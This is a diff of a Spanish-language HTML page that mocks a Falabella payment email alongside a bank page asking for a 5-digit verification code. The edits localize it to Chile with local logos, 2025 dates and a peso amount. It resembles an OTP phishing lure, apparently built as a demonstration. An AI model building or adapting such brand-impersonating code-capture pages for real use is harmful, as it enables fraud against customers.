@@ -1,15 +1,13 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
+<html lang="es" style="--transcript-star-color: rgba(255, 255, 255, 1);"><plasmo-csui></plasmo-csui><plasmo-csui></plasmo-csui><plasmo-csui></plasmo-csui><plasmo-csui></plasmo-csui><plasmo-csui></plasmo-csui><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificación de Pago - Banco Seguro</title>
     <style>
         :root {
-            --primary-color: #E2001A; /* Rojo Falabella */
-            --secondary-color: #C50016;
-            --bank-blue: #1565C0;
-            --bank-dark-blue: #0D47A1;
+            --primary-color: #c2d100; 
+            --secondary-color: #eeff00;
+            --bank-blue: #c2d100;
+            --bank-dark-blue: #eeff00;
             --dark-color: #333333;
             --light-gray: #F5F5F5;
             --medium-gray: #E0E0E0;
@@ -346,7 +344,7 @@
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-</head>
+<style id="_goober"> @keyframes go2264125279{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go3020080000{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}@keyframes go463499852{from{transform:scale(0) rotate(90deg);opacity:0;}to{transform:scale(1) rotate(90deg);opacity:1;}}@keyframes go1268368563{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}@keyframes go1310225428{from{transform:scale(0) rotate(45deg);opacity:0;}to{transform:scale(1) rotate(45deg);opacity:1;}}@keyframes go651618207{0%{height:0;width:0;opacity:0;}40%{height:0;width:6px;opacity:1;}100%{opacity:1;height:10px;}}@keyframes go901347462{from{transform:scale(0.6);opacity:0.4;}to{transform:scale(1);opacity:1;}}.go4109123758{z-index:9999;}.go4109123758 > *{pointer-events:auto;}</style><meta name="web-speech-cognitive-services" content="version=7.1.3"><style type="text/css">@import url('https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap');</style></head>
 <body>
     <!-- Mensajes flotantes (inicialmente ocultos) -->
     <div id="floatingSuccess" class="floating-message success">
@@ -368,7 +366,7 @@
         <!-- Correo Electrónico -->
         <div class="email-container">
             <div class="email-header">
-                <img src="https://www.falabella.com/fala-cdn/static-files/images/logo-falabella.png" alt="Falabella" class="logo">
+                <img src="img/falabellablanco.png" alt="Falabella" class="logo">
             </div>
             
             <div class="email-content">
@@ -389,11 +387,11 @@
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Fecha:</span>
-                        <span class="detail-value">15/06/2023</span>
+                        <span class="detail-value">15/06/2025</span>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Monto total:</span>
-                        <span class="detail-value">$1,250.00</span>
+                        <span class="detail-value">$59.980</span>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Método de pago:</span>
@@ -414,7 +412,7 @@
                     </div>
                     <div class="step">
                         <div class="step-number">2</div>
-                        <div>Busca la transacción pendiente por $1,250.00</div>
+                        <div>Busca la transacción pendiente por $59.980</div>
                     </div>
                     <div class="step">
                         <div class="step-number">3</div>
@@ -438,7 +436,7 @@
             </div>
             
             <div class="email-footer">
-                <p>© 2023 Falabella. Todos los derechos reservados.</p>
+                <p>© 2025 Falabella. Todos los derechos reservados.</p>
                 <p>Este es un correo automático, por favor no respondas a este mensaje.</p>
             </div>
         </div>
@@ -446,7 +444,7 @@
         <!-- Página del Banco -->
         <div class="bank-container">
             <div class="bank-header">
-                <img src="https://via.placeholder.com/120x30?text=BancoSeguro" alt="BancoSeguro" class="bank-logo">
+                <img src="img/Falabella.svg" alt="BancoSeguro" class="bank-logo">
                 <div style="font-size: 14px;">Verificación de Pago</div>
             </div>
             
@@ -456,17 +454,17 @@
                 </h2>
                 
                 <div class="verification-message">
-                    <p>Estás completando un pago a <strong>Falabella</strong> por <span style="color: var(--danger-color);">$1,250.00</span>. Para confirmar que eres tú, ingresa el código de 5 dígitos que recibiste.</p>
+                    <p>Estás completando un pago a <strong>Falabella</strong> por <span style="color: var(--danger-color);">$59.980</span>. Para confirmar que eres tú, ingresa el código de 5 dígitos que recibiste.</p>
                 </div>
                 
                 <form id="bankVerificationForm">
                     <label style="display: block; margin-bottom: 10px; font-weight: bold;">Código de verificación:</label>
                     <div class="code-input-container">
-                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
-                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
-                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
-                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
-                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required>
+                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required="">
+                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required="">
+                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required="">
+                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required="">
+                        <input type="text" class="code-input" maxlength="1" pattern="[0-9]" required="">
                     </div>
                     
                     <button type="submit" class="bank-cta-button">Confirmar Pago</button>
@@ -482,8 +480,8 @@
                 
                 <div style="font-size: 14px; color: #666; margin-top: 30px;">
                     <p><strong>Operación:</strong> Pago a Falabella #987654</p>
-                    <p><strong>Dispositivo:</strong> iPhone en Lima, PE</p>
-                    <p><strong>Hora:</strong> 15/06/2023 14:30</p>
+                    <p><strong>Dispositivo:</strong> iPhone en Chile, CLP</p>
+                    <p><strong>Hora:</strong> 15/06/2025 14:30</p>
                 </div>
             </div>
         </div>
@@ -565,5 +563,5 @@
             }
         });
     </script>
-</body>
-</html>
+
+<tldx-lmi-shadow-root data-wxt-shadow-root=""></tldx-lmi-shadow-root><div id="tldx-toast-container"></div></body><text-blaze-app-reference style="display: contents !important;"></text-blaze-app-reference></html>
